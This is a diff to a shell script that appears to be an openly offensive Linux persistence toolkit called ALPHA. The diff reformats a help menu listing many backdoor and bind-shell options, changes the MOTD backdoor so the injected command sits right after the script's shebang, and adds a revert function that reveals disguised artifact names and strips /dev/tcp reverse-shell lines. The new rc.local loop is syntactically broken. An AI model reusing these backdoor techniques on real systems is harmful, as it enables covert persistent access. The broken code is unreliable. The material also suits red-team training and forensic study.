@@ -34,46 +34,48 @@ usage_user() {
 	echo ""
 	echo "Low Privileged User Options:"
 	echo ""
-	echo "  --cron                      Cron job persistence"
-	echo "  --ssh-key                   SSH key persistence"
-	echo "  --systemd                   Systemd service persistence"
-	echo "  --at                         At job persistence"
-	echo "  --shell-profile         Shell profile persistence"
-	echo "  --xdg                        XDG autostart persistence"
-	echo "  --authorized-keys            Authorized keys management"
-	echo "  --bind-shell                 Setup a bind shell"
-	echo "  --git                 		Setup Git persistence"
-	echo "  --quiet (-q) 			   Quiet mode (no banner)"
+	echo "  --cron                Cron job persistence"
+	echo "  --ssh-key             SSH key persistence"
+	echo "  --systemd             Systemd service persistence"
+	echo "  --at                  At job persistence"
+	echo "  --shell-profile       Shell profile persistence"
+	echo "  --xdg                 XDG autostart persistence"
+	echo "  --authorized-keys     Authorized keys management"
+	echo "  --bind-shell          Setup a bind shell"
+	echo "  --git                 Setup Git persistence"
+	echo "  --revert		      Revert most changes made by ALPHA"
+	echo "  --quiet (-q) 		  Quiet mode (no banner)"
 }
 
 usage_root() {
 	echo "Root User Options:"
 	echo ""
-	echo "  --cron                      Cron job persistence"
-	echo "  --ssh-key                   SSH key persistence"
-	echo "  --systemd                   Systemd service persistence"
-	echo "  --generator                 Set up generator persistence"
-	echo "  --at                         At job persistence"
-	echo "  --shell-profile         Shell profile persistence"
-	echo "  --xdg                        XDG autostart persistence"
-	echo "  --authorized-keys            Authorized keys management"
-	echo "  --create-user                Create a new user"
-	echo "  --backdoor-user              Set up a backdoor user"
-	echo "  --password-change            Change user password"
-	echo "  --passwd-user                Add user to /etc/passwd with specified settings"
-	echo "  --sudoers           Set up sudoers backdoor"
-	echo "  --suid              Set up SUID backdoor"
-	echo "  --cap               Set up capabilities backdoor"
-	echo "  --motd              Set up MOTD backdoor"
-	echo "  --rc-local          Set up rc.local backdoor"
-	echo "  --initd             Set up init.d backdoor"
-	echo "  --package-manager    Set up Package Manager persistence"
-	echo "  --bind-shell                 Setup a bind shell"
-	echo "  --system-binary     Set up a system binary backdoor"
-	echo "  --udev                      Cron job persistence"
-	echo "  --git                 		Setup Git persistence"
-    echo "  --docker-container   Set up a malicious Docker container"
-	echo "  --quiet (-q) 			   Quiet mode (no banner)"
+	echo "  --cron                Cron job persistence"
+	echo "  --ssh-key             SSH key persistence"
+	echo "  --systemd             Systemd service persistence"
+	echo "  --generator           Set up generator persistence"
+	echo "  --at                  At job persistence"
+	echo "  --shell-profile       Shell profile persistence"
+	echo "  --xdg                 XDG autostart persistence"
+	echo "  --authorized-keys     Authorized keys management"
+	echo "  --create-user         Create a new user"
+	echo "  --backdoor-user       Set up a backdoor user"
+	echo "  --password-change     Change user password"
+	echo "  --passwd-user         Add user to /etc/passwd with specified settings"
+	echo "  --sudoers             Set up sudoers backdoor"
+	echo "  --suid                Set up SUID backdoor"
+	echo "  --cap                 Set up capabilities backdoor"
+	echo "  --motd                Set up MOTD backdoor"
+	echo "  --rc-local            Set up rc.local backdoor"
+	echo "  --initd               Set up init.d backdoor"
+	echo "  --package-manager     Set up Package Manager persistence"
+	echo "  --bind-shell          Set up a bind shell"
+	echo "  --system-binary       Set up a system binary backdoor"
+	echo "  --udev                Cron job persistence"
+	echo "  --git                 Setup Git persistence"
+    echo "  --docker-container    Set up a malicious Docker container"
+	echo "  --revert		      Revert most changes made by ALPHA"
+	echo "  --quiet (-q) 		  Quiet mode (no banner)"
     echo ""
 }
 
@@ -1512,7 +1514,10 @@ setup_motd_backdoor() {
 			echo -e "#!/bin/sh\n$command" > $path
 			chmod +x $path
 		else
-			echo "$command" >> $path
+			# Read the first line and the rest of the file separately
+			first_line=$(head -n 1 $path)
+			rest_of_file=$(tail -n +2 $path)
+			echo -e "#!/bin/sh\n$command\n${rest_of_file}" > $path
 		fi
 		echo "[+] MOTD backdoor established in $path"
 	fi
@@ -2704,6 +2709,162 @@ setup_malicious_docker_container() {
 	echo "[+] To escape the container with root privileges, run '/usr/local/bin/escape.sh'."
 }
 
+revert_changes() {
+    local current_user=$(whoami)
+    local ssh_dir="/home/$current_user/.ssh"
+
+    # Systemd
+    echo "[*] Cleaning Systemd persistence methods..."
+    systemctl stop dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
+    systemctl disable dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
+    rm -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.service
+    rm -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer
+    rm -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.service
+    rm -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.timer
+    echo "[+] Successfully cleaned persistence method Systemd"
+
+    # Systemd Generator
+    echo "[*] Cleaning Systemd Generator persistence methods..."
+    systemctl stop generator.service 2>/dev/null
+    systemctl disable generator.service 2>/dev/null
+    rm -f /usr/lib/systemd/system-generators/makecon
+    rm -f /usr/lib/systemd/system-generators/generator
+    rm -f /run/systemd/system/generator.service
+    rm -f /run/systemd/system/multi-user.target.wants/generator.service
+    echo "[+] Successfully cleaned persistence method Systemd Generator"
+
+    # Cron
+    echo "[*] Cleaning Cron persistence methods..."
+    rm -f /etc/cron.d/freedesktop_timesync1
+    for file in /etc/cron*; do
+        [ -e "$file" ] && sed -i "/\/dev\/tcp/ d" $file 2>/dev/null
+    done
+    crontab -l | grep -v "/dev/tcp" | grep -v "-i" | crontab -
+    echo "[+] Successfully cleaned persistence method Cron"
+
+    # At
+    echo "[*] Cleaning At persistence methods..."
+    for file in /var/spool/cron/atjobs/*; do
+        [ -e "$file" ] && sed -i "/\/dev\/tcp/ d" $file 2>/dev/null
+    done
+    echo "[+] Successfully cleaned persistence method At"
+
+    # Shell profile
+    echo "[*] Cleaning Shell profile persistence methods..."
+    [ -e "/etc/profile" ] && sed -i "/\/dev\/tcp/ d" /etc/profile 2>/dev/null
+    [ -e "/home/$current_user/.bash_profile" ] && sed -i "/\/dev\/tcp/ d" /home/$current_user/.bash_profile 2>/dev/null
+    echo "[+] Successfully cleaned persistence method Shell profile"
+
+    # XDG
+    echo "[*] Cleaning XDG persistence methods..."
+    rm -f /etc/xdg/autostart/pkc12-register.desktop
+    rm -f /etc/xdg/pkc12-register
+    rm -f /home/$current_user/.config/autostart/user-dirs.desktop
+    rm -f /home/$current_user/.config/autostart/.user-dirs
+    echo "[+] Successfully cleaned persistence method XDG"
+
+    # SSH
+    echo "[*] Cleaning SSH persistence methods..."
+    rm -f $ssh_dir/id_rsa1822
+    rm -f $ssh_dir/id_rsa1822.pub
+    echo "[+] Successfully cleaned persistence method SSH"
+
+    # Sudoers
+    echo "[*] Cleaning Sudoers persistence methods..."
+    rm -f /etc/sudoers.d/$current_user
+    echo "[+] Successfully cleaned persistence method Sudoers"
+
+    # Setuid
+    echo "[*] Cleaning Setuid persistence methods..."
+    for bin in find dash python python3; do
+        [ -e "$(which $bin)" ] && chmod u-s $(which $bin) 2>/dev/null
+    done
+    echo "[+] Successfully cleaned persistence method Setuid"
+
+    # MOTD
+    echo "[*] Cleaning MOTD persistence methods..."
+    rm -f /etc/update-motd.d/137-python-upgrades
+    for file in /etc/update-motd.d/*; do
+        [ -e "$file" ] && sed -i "/\/dev\/tcp/ d" $file 2>/dev/null
+    done
+    echo "[+] Successfully cleaned persistence method MOTD"
+
+    # rc.local
+    echo "[*] Cleaning rc.local persistence methods..."
+    for file in /etc/update-motd.d/*; do
+        [ -e "$file" ] && sed -i "/\/dev\/tcp/ d" /etc/rc.local 2>/dev/null
+    echo "[+] Successfully cleaned persistence method rc.local"
+
+    # initd
+    echo "[*] Cleaning initd persistence methods..."
+    rm -f /etc/init.d/ssh-procps
+    echo "[+] Successfully cleaned persistence method initd"
+
+    # Package Managers
+    echo "[*] Cleaning Package Managers persistence methods..."
+    rm -f /etc/apt/apt.conf.d/01python-upgrades
+    rm -f /usr/lib/yumcon
+    rm -f /usr/lib/yum-plugins/yumcon.py
+    rm -f /etc/yum/pluginconf.d/yumcon.conf
+    local python_version=$(ls /usr/lib | grep -oP 'python3\.\d+' | head -n 1)
+    [ -n "$python_version" ] && rm -f /usr/lib/$python_version/site-packages/dnfcon
+    rm -f /etc/dnf/plugins/dnfcon.conf
+    [ -n "$python_version" ] && rm -f /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
+    echo "[+] Successfully cleaned persistence method Package Managers"
+
+    # setcap
+    echo "[*] Cleaning setcap persistence methods..."
+    for bin in perl ruby php python python3 node; do
+        [ -e "$(which $bin)" ] && setcap -r $(which $bin) 2>/dev/null
+    done
+    echo "[+] Successfully cleaned persistence method setcap"
+
+    # Bind shell
+    echo "[*] Cleaning Bind shell persistence methods..."
+    pkill -f /tmp/bd86 2>/dev/null
+    rm -f /tmp/bd86
+
+    pkill -f /tmp/bd64 2>/dev/null
+    rm -f /tmp/bd64
+    echo "[+] Successfully cleaned persistence method Bind shell"
+
+    # Backdoor binaries
+    echo "[*] Cleaning Backdoor binaries persistence methods..."
+    for binary in cat ls; do
+        original=$(which $binary).original
+        if [ -f "$original" ]; then
+            mv "$original" "$(which $binary)" 2>/dev/null
+            if [ $? -eq 0 ]; then
+                echo "[+] Successfully restored $binary binary"
+            else
+                echo "[-] Failed to restore $binary binary"
+            fi
+        else
+            echo "[*] No original file for $binary found, skipping..."
+        fi
+    done
+    echo "[+] Successfully cleaned persistence method Backdoor binaries"
+
+    # udev
+    echo "[*] Cleaning udev persistence methods..."
+    rm -f /usr/bin/atest
+    rm -f /etc/udev/rules.d/10-atest.rules
+    rm -f /usr/bin/crontest
+    rm -f /etc/udev/rules.d/11-crontest.rules
+    rm -f /etc/udev/rules.d/12-systemdtest.rules
+    systemctl stop systemdtest.service 2>/dev/null
+    systemctl disable systemdtest.service 2>/dev/null
+    rm -f /etc/systemd/system/systemdtest.service
+    echo "[+] Successfully cleaned persistence method udev"
+
+    # Docker
+    echo "[*] Cleaning Docker persistence methods..."
+    rm -f /tmp/Dockerfile
+    docker stop malicious-container 2>/dev/null
+    docker rm malicious-container 2>/dev/null
+    echo "[+] Successfully cleaned persistence method Docker"
+}
+
 main() {
 	local QUIET=0
 
@@ -2853,6 +3014,11 @@ main() {
                 setup_malicious_docker_container "$@"
                 exit
                 ;;
+			--revert )
+				shift
+				revert_changes
+				exit
+				;;
 			* )
 				echo "Invalid option: $1"
 				if check_root; then
